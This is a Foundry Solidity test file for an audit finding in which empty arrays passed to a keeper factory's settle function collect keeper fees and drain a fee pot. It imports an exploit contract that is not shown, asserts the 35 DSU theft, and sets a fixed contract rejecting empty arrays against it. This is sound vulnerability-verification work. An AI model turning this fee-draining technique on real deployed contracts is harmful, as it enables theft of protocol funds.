// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {
    Exploit,
    DSU,
    EthFeed,
    FeePot,
    KeeperFactory,
    KeeperFactoryInvalidSettleError,
    IMarket,
    IKeeperOracle,
    MockKeeperOracle
} from "./28951-h-4-attacker-can-call-keeperfactorysettle-with-empty-arrays.sol";

/// Control: the audited fix. Revert when ids.length == 0, before any oracle work,
/// so the keep modifier never pays. A non-empty settle still pays the caller.
contract KeeperFactoryFixed is KeeperFactory {
    constructor(DSU dsu_, EthFeed feed_, FeePot pot_) KeeperFactory(dsu_, feed_, pot_) {}

    function settle(bytes32[] memory ids, IMarket[] memory markets, uint256[] memory versions, uint256[] memory maxCounts)
        external
        override
        keep(settleKeepConfig(), msg.data, 0, "")
    {
        if (
            ids.length == 0 ||
            ids.length != markets.length ||
            ids.length != versions.length ||
            ids.length != maxCounts.length ||
            abi.encodeCall(KeeperFactoryFixed.settle, (ids, markets, versions, maxCounts)).length != msg.data.length
        ) revert KeeperFactoryInvalidSettleError();

        for (uint256 i; i < ids.length; i++)
            IKeeperOracle(address(oracles[ids[i]])).settle(markets[i], versions[i], maxCounts[i]);
    }
}

contract Finding28951Test is Test {
    function test_exploit_empty_settle_steals_keeper_fees() public {
        vm.fee(7);
        Exploit e = new Exploit();
        uint256 beforeBal = e.dsu().balanceOf(address(this));
        e.run();
        emit log_named_decimal_uint("stolen DSU", e.stolenAmount(), 18);
        emit log_named_decimal_uint("fee per empty settle", e.factory().lastFee(), 18);
        emit log_named_uint("accounts settled", e.factory().accountsSettled());
        assertEq(e.stolenAmount(), 35e18, "35 DSU stolen");
        assertEq(e.dsu().balanceOf(address(this)) - beforeBal, 35e18, "caller received 35 DSU");
        assertEq(e.dsu().balanceOf(address(e.pot())), 0, "fee pot drained");
        assertEq(e.factory().accountsSettled(), 0, "no account was settled");
        assertEq(e.factory().lastFee(), 7e18, "each empty settle paid 7 DSU");
        assertEq(e.dsu().balanceOf(address(e)), 0, "exploit forwarded the haul");
    }

    function test_control_empty_arrays_rejected_fee_stays_with_honest_keeper() public {
        vm.fee(7);
        DSU dsu = new DSU();
        EthFeed feed = new EthFeed();
        FeePot pot = new FeePot(dsu);
        KeeperFactoryFixed fixedFactory = new KeeperFactoryFixed(dsu, feed, pot);
        dsu.mint(address(pot), 35e18);

        bytes32[] memory ids = new bytes32[](0);
        IMarket[] memory markets = new IMarket[](0);
        uint256[] memory versions = new uint256[](0);
        uint256[] memory maxCounts = new uint256[](0);

        vm.expectRevert(KeeperFactoryInvalidSettleError.selector);
        fixedFactory.settle(ids, markets, versions, maxCounts);
        assertEq(dsu.balanceOf(address(pot)), 35e18, "empty settle paid nothing");
        assertEq(dsu.balanceOf(address(this)), 0, "attacker received nothing");
        assertEq(fixedFactory.accountsSettled(), 0, "still no settlement");

        MockKeeperOracle oracle = new MockKeeperOracle(fixedFactory);
        bytes32 id = bytes32(uint256(1));
        fixedFactory.registerOracle(id, address(oracle));
        bytes32[] memory oneId = new bytes32[](1);
        oneId[0] = id;
        IMarket[] memory oneMarket = new IMarket[](1);
        oneMarket[0] = IMarket(address(0xBEEF));
        uint256[] memory oneVersion = new uint256[](1);
        oneVersion[0] = 7;
        uint256[] memory oneCount = new uint256[](1);
        oneCount[0] = 1;

        fixedFactory.settle(oneId, oneMarket, oneVersion, oneCount);
        emit log_named_decimal_uint("pot left after honest settle", dsu.balanceOf(address(pot)), 18);
        emit log_named_decimal_uint("honest keeper DSU", dsu.balanceOf(address(this)), 18);
        assertEq(fixedFactory.accountsSettled(), 1, "honest settle did the callback");
        assertEq(dsu.balanceOf(address(this)), 7e18, "honest keeper received one fee");
        assertEq(dsu.balanceOf(address(pot)), 28e18, "the rest of the pot stayed");
        assertEq(fixedFactory.lastFee(), 7e18, "same fee schedule");
    }
}
